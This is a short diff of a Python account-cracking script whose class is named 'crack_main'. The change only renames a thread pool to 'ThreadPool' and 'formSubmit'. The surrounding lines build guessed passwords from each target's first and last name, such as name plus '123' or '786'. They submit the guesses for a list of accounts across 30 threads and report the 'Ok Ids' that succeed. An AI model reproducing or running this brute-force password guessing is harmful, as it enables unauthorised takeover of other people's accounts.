@@ -554,7 +554,7 @@ class crack_main():
                 input('\n Press enter to back ')
                 main()
         def zee(self):
-                with tred(max_workers=30) as Zee:
+                with ThreadPool(max_workers=30) as formSubmit:
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
@@ -570,7 +570,7 @@ class crack_main():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                Zee.submit(self.m1,iid,name,passlist)
+                                formSubmit.submit(self.m1,iid,name,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
                 print(' Total Ok Ids : '+str(len(ok)))
